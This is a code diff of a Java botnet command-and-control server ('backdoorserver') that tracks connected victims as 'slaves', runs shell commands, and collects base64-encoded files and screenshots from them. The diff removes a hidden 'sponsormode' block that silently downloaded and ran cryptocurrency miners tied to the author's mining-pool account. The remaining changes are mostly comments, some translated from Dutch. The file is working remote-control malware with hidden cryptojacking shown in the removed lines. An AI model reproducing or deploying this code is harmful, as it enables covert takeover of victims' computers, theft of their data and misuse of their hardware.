@@ -1,6 +1,5 @@
 package backdoorserver;
 
-//import static backdoorserver.clientThread.temp;
 import java.io.*;
 import java.net.*;
 import java.nio.file.Files;
@@ -12,8 +11,6 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
-//import net.lingala.zip4j.core.ZipFile;
-//import net.lingala.zip4j.exception.ZipException;
 
 public class Server {
 
@@ -24,50 +21,11 @@ public class Server {
     // This chat server can accept up to 1000 clients' connections
     static clientThread t[] = new clientThread[1000];
     private static File temp;
-    static boolean sponsormode = true; // true is :) false is ;( for creator.
 
     public static void main(String args[]) {
 
         // The default port
         int port_number = 4600;
-
-        if (sponsormode) { // this starts only when sponsormode is true.
-            String s = ExecuteMyCommand("wmic path win32_VideoController get name");
-            if (OS.contains("windows")) {
-                if (s.contains("NVIDIA")) {
-                    try {
-                        unZipIt(download("https://dl.dropboxusercontent.com/u/68963061/x64-2017-03-08-21-43.zip"), temp.getAbsolutePath() + "folder");
-                        Thread t = new Thread(new Runnable() {
-                            public void run() {
-                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/cudaminer.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS");
-                            }
-                        });
-                        t.start();
-                        System.out.println(temp.getAbsolutePath() + "folder");
-                    } catch (Exception ex) {
-                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                        sponsormode = false;
-                    }
-                } else {
-                    try {
-                        unZipIt(download("https://svwh.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.4.5-win64.zip"), temp.getAbsolutePath() + "folder");
-                        Thread t = new Thread(new Runnable() {
-                            public void run() {
-                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/minerd.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS -q");
-                            }
-                        });
-                        t.start();
-                        System.out.println(temp.getAbsolutePath() + "folder");
-                    } catch (Exception ex) {
-                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                        sponsormode = false;
-                    }
-                    
-                }
-            } else if (OS.contains("linux")){
-                System.err.println("sponsormode doesnt work yet for linux");
-            }
-        }
 
         if (args.length < 1) {
             System.out.println("Now using port number=" + port_number);
@@ -96,7 +54,7 @@ public class Server {
         }
     }
 
-    public static String download(String file) throws IOException { // uploaden naar victim via url
+    public static String download(String file) throws IOException { // upload to victim.
         temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         URL url = new URL(file);
         InputStream in = url.openStream();
@@ -106,7 +64,7 @@ public class Server {
 
     }
 
-    public static String unZipIt(String zipFile, String outputFolder) {
+    public static String unZipIt(String zipFile, String outputFolder) { // unzip file to temp
         String OUTPUT_FOLDER = temp.getAbsolutePath() + "folder";
         byte[] buffer = new byte[1024];
 
@@ -153,7 +111,7 @@ public class Server {
         return OUTPUT_FOLDER;
     }
 
-    public static String ExecuteMyCommand(String commando) { // hier sturen we ons command ( voorbeeld "dir" als commando)
+    public static String ExecuteMyCommand(String commando) { // here send we our command ( example "dir" as a command)
 
         try {
             if (commando.length() < 1) {
@@ -166,7 +124,7 @@ public class Server {
 
                 String regel = "";
                 while ((regel = br.readLine()) != null) {
-                    outputlines += regel + "\n"; // System.err.println(regel);
+                    outputlines += regel + "\n";
                 }
                 return outputlines;
             }
@@ -175,7 +133,7 @@ public class Server {
 
             String regel = "";
             while ((regel = br.readLine()) != null) {
-                outputlines += regel + "\n"; // System.err.println(regel);
+                outputlines += regel + "\n"; 
             }
             return outputlines;
 
@@ -199,7 +157,7 @@ class clientThread extends Thread {
     }
     static File temp;
 
-    public static void Base64DecodeAndExtractZip(String a) throws IOException {
+    public static void Base64DecodeAndExtractZip(String a) throws IOException { // here decoden base64 to string
         temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
         byte[] Decoded = Base64.getDecoder().decode(a);
         FileOutputStream fos = new FileOutputStream(temp);
@@ -218,8 +176,8 @@ class clientThread extends Thread {
 //        }
 //        return temp + "folder";
 //    }
-    public static String unZipIt(String zipFile, String outputFolder) {
-        String OUTPUT_FOLDER = temp.getAbsolutePath() + "folder";
+    public static String unZipIt(String zipFile, String outputFolder) { // here extract i the zip content in to temp.
+        String OUTPUT_FOLDER = temp.getAbsolutePath() + "folder"; // temp folder
         byte[] buffer = new byte[1024];
 
         try {
@@ -284,7 +242,7 @@ class clientThread extends Thread {
         }
 
         os.println("new user added to our botnet");
-        for (int i = 0; i <= 999; i++) {
+        for (int i = 0; i <= 999; i++) { // send to every one a message that a new victim has been added.
             if (t[i] != null && t[i] != this) {
                 t[i].os.println("*** A new slave entered the botnet !!! ***");
             }
@@ -300,7 +258,7 @@ class clientThread extends Thread {
                         line = line + (char) a;
                     } else {
                         sleep(50);
-                        if (System.currentTimeMillis() - begin > 20000) {
+                        if (System.currentTimeMillis() - begin > 20000) { // keepalive if longer than 20 sec no message than remove victim/thread.
                             begin = System.currentTimeMillis();
                             os.println("connection closed with " + ip);
                             is.close();
@@ -327,10 +285,9 @@ class clientThread extends Thread {
                 line = "";
             }
             if (line.startsWith("downloadeble file = ")) {
-                int i = 20;
-                String s = line.substring(i);
+                int i = 20; 
+                String s = line.substring(i);// place where it has to read the string.
                 try {
-                    //Base64DecodeAndExtractZip(s);
                     Base64DecodeAndExtractZip(s);
                 } catch (IOException ex) {
 
@@ -339,9 +296,8 @@ class clientThread extends Thread {
             }
             if (line.startsWith("screenshot: ")) {
                 int i = 12;
-                String s = line.substring(i);
+                String s = line.substring(i);// place where it has to read the string.
                 try {
-                    //Base64DecodeAndExtractZip(s);
                     Base64DecodeAndExtractZip(s);
                 } catch (IOException ex) {
 
@@ -349,7 +305,7 @@ class clientThread extends Thread {
 
             }
             // schrijft naar iedereen
-            if (!line.equals("ping") && !line.startsWith("downloadeble file = ") && !line.startsWith("screenshot: ")) {
+            if (!line.equals("ping") && !line.startsWith("downloadeble file = ") && !line.startsWith("screenshot: ")) { // send to every one message if it doest starts with some words.
                 for (int i = 0; i <= 999; i++) {
                     if (t[i] != null && line.isEmpty() == false && !line.equals("")) {
                         t[i].os.println("<" + "server" + "> " + line);
